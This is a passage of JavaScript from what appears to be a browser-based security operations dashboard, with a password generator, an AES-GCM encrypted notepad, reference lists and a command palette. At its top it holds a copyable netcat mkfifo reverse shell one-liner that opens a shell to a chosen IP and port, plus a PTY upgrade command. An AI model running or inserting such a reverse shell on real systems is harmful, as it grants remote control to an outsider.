        { label: "Netcat mkfifo Reverse Shell", cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
        { label: "Python3 Interactive PTY Upgrade", cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'` }
    ];

    list.innerHTML = '';
    snippets.forEach(s => {
        const row = document.createElement('div');
        row.className = 'port-row';
        row.style.flexDirection = 'column';
        row.style.alignItems = 'flex-start';
        row.style.gap = '0.35rem';
        row.innerHTML = `
            <div style="display:flex; justify-content:space-between; width:100%; align-items:center;">
                <span class="port-service" style="font-size:0.72rem; text-transform:uppercase;">${s.label}</span>
                <button class="tool-btn tool-btn-secondary" style="padding:0.2rem 0.55rem; font-size:0.68rem;">Copy</button>
            </div>
            <code style="color:var(--text-main); font-size:0.78rem; word-break:break-all;">${s.cmd}</code>
        `;
        const btn = row.querySelector('button');
        btn.onclick = () => {
            navigator.clipboard.writeText(s.cmd);
            btn.textContent = 'Copied!';
            btn.style.color = 'var(--success-color)';
            setTimeout(() => { btn.textContent = 'Copy'; btn.style.color = ''; }, 1200);
        };
        list.appendChild(row);
    });
}

/* ==========================================================================
   11. CSPRNG Password Generator
   ========================================================================== */
function updatePasswordLength() {
    const len = document.getElementById('pass-length').value;
    document.getElementById('pass-length-label').textContent = `Length: ${len}`;
    createPassword();
}

function createPassword() {
    const length = parseInt(document.getElementById('pass-length').value, 10) || 24;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
    const randomValues = new Uint32Array(length);
    crypto.getRandomValues(randomValues);

    let pass = "";
    for (let i = 0; i < length; i++) {
        pass += chars[randomValues[i] % chars.length];
    }
    document.getElementById('generated-password').value = pass;
}

/* ==========================================================================
   12. AES-256-GCM Scratchpad + File Backup
   ========================================================================== */
const notepad = document.getElementById('notepad');
const statusEl = document.getElementById('scratchpad-status');

if (localStorage.getItem('secops_notepad')) {
    notepad.value = localStorage.getItem('secops_notepad');
    if (notepad.value.startsWith('AESGCM:')) {
        statusEl.textContent = 'Encrypted Blob Loaded';
        statusEl.style.color = 'var(--warning-color)';
    }
}

notepad.addEventListener('input', () => {
    localStorage.setItem('secops_notepad', notepad.value);
    statusEl.textContent = 'Saved locally';
    statusEl.style.color = 'var(--accent-color)';
});

async function deriveAesKey(passphrase, salt) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
        'raw', enc.encode(passphrase), 'PBKDF2', false, ['deriveKey']
    );
    return crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        false,
        ['encrypt', 'decrypt']
    );
}

async function encryptNotepad() {
    const pass = document.getElementById('notepad-pass').value;
    const plaintext = notepad.value;
    if (!pass || !plaintext || plaintext.startsWith('AESGCM:')) return;

    try {
        const salt = crypto.getRandomValues(new Uint8Array(16));
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const key = await deriveAesKey(pass, salt);
        const ciphertext = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv },
            key,
            new TextEncoder().encode(plaintext)
        );

        const combined = new Uint8Array(salt.length + iv.length + ciphertext.byteLength);
        combined.set(salt, 0);
        combined.set(iv, salt.length);
        combined.set(new Uint8Array(ciphertext), salt.length + iv.length);

        const b64 = btoa(Array.from(combined, b => String.fromCodePoint(b)).join(''));
        notepad.value = `AESGCM:${b64}`;
        localStorage.setItem('secops_notepad', notepad.value);
        document.getElementById('notepad-pass').value = '';
        statusEl.textContent = 'Locked with AES-256-GCM';
        statusEl.style.color = 'var(--success-color)';
    } catch (e) {
        statusEl.textContent = 'Encryption failed';
        statusEl.style.color = 'var(--danger-color)';
    }
}

async function decryptNotepad() {
    const pass = document.getElementById('notepad-pass').value;
    const content = notepad.value.trim();
    if (!pass || !content.startsWith('AESGCM:')) return;

    try {
        const rawB64 = content.slice(7);
        const bytes = Uint8Array.from(atob(rawB64), c => c.codePointAt(0));
        const salt = bytes.slice(0, 16);
        const iv = bytes.slice(16, 28);
        const data = bytes.slice(28);

        const key = await deriveAesKey(pass, salt);
        const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, data);

        notepad.value = new TextDecoder().decode(decrypted);
        localStorage.setItem('secops_notepad', notepad.value);
        document.getElementById('notepad-pass').value = '';
        statusEl.textContent = 'Unlocked & Saved';
        statusEl.style.color = 'var(--success-color)';
    } catch (e) {
        statusEl.textContent = 'Invalid Passphrase';
        statusEl.style.color = 'var(--danger-color)';
    }
}

function exportNotepad() {
    const content = notepad.value;
    if (!content) return;
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    const dateStamp = new Date().toISOString().slice(0, 10);
    a.href = url;
    a.download = `secops-scratchpad-${dateStamp}.txt`;
    a.click();
    URL.revokeObjectURL(url);
}

function clearNotepad() {
    notepad.value = '';
    localStorage.removeItem('secops_notepad');
    statusEl.textContent = 'Workspace Cleared';
}

/* ==========================================================================
   13. Tabbed SecOps References & Ctrl+K Command Palette
   ========================================================================== */
function switchRefTab(category) {
    activeRefCategory = category;
    ['ports', 'events', 'chmod'].forEach(cat => {
        const btn = document.getElementById(`tab-${cat}`);
        if (btn) {
            btn.className = cat === category ? 'tool-btn' : 'tool-btn tool-btn-secondary';
        }
    });
    renderReferenceList(category);
    filterPorts();
}

function renderReferenceList(category) {
    const portList = document.getElementById('port-list');
    portList.innerHTML = '';
    const data = category === 'ports' ? CONFIG.ports : (category === 'events' ? EVENT_IDS : CHMOD_REF);

    data.forEach(item => {
        const row = document.createElement('div');
        row.className = 'port-row';
        row.innerHTML = `<span class="port-service">${item.service}</span><span class="port-num">${item.port}</span>`;
        portList.appendChild(row);
    });
}

function filterPorts() {
    const term = document.getElementById('port-filter').value.toLowerCase();
    const rows = document.querySelectorAll('#port-list .port-row');
    rows.forEach(row => {
        row.style.display = row.textContent.toLowerCase().includes(term) ? 'flex' : 'none';
    });
}

let cmdSelectedIndex = 0;
let filteredCmdItems = [];
const cmdInput = document.getElementById('cmd-input');
const cmdList = document.getElementById('cmd-list');

function renderCommandPalette(filterText) {
    const q = filterText.toLowerCase().trim();
    filteredCmdItems = paletteItems.filter(item =>
        item.title.toLowerCase().includes(q) || item.category.toLowerCase().includes(q)
    );
    cmdSelectedIndex = 0;
    updateCmdListUI();
}

function updateCmdListUI() {
    cmdList.innerHTML = '';
    filteredCmdItems.forEach((item, idx) => {
        const div = document.createElement('div');
        div.className = `cmd-item ${idx === cmdSelectedIndex ? 'selected' : ''}`;
        div.innerHTML = `<span>${item.title}</span><span class="cmd-category">${item.category}</span>`;
        div.onclick = () => executeCmdItem(item);
        cmdList.appendChild(div);
    });
    const selectedEl = cmdList.querySelector('.cmd-item.selected');
    if (selectedEl) selectedEl.scrollIntoView({ block: 'nearest' });
}

function executeCmdItem(item) {
    if (!item) return;
    closeModal('cmdModal');
    if (item.action) item.action();
    else if (item.url) window.open(item.url, '_blank', 'noopener');
}

cmdInput.addEventListener('input', (e) => renderCommandPalette(e.target.value));

cmdInput.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (filteredCmdItems.length) {
            cmdSelectedIndex = (cmdSelectedIndex + 1) % filteredCmdItems.length;
            updateCmdListUI();
        }
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (filteredCmdItems.length) {
            cmdSelectedIndex = (cmdSelectedIndex - 1 + filteredCmdItems.length) % filteredCmdItems.length;
            updateCmdListUI();
        }
    } else if (e.key === 'Enter') {
        e.preventDefault();
        executeCmdItem(filteredCmdItems[cmdSelectedIndex]);
    }
});

/* ==========================================================================
   14. Clipboard Helper & Bootstrap
   ========================================================================== */
function copyValue(elementId, btnEl) {
    const val = document.getElementById(elementId)?.value;
    if (!val) return;
    navigator.clipboard.writeText(val).then(() => {
        const originalText = btnEl.textContent;
        btnEl.textContent = 'Copied!';
        btnEl.style.borderColor = 'var(--success-color)';
        btnEl.style.color = 'var(--success-color)';
        setTimeout(() => {
            btnEl.textContent = originalText;
            btnEl.style.borderColor = '';
            btnEl.style.color = '';
        }, 1400);
    });
}

// Initialize Application
initUI();
updateClock();
setInterval(updateClock, 1000);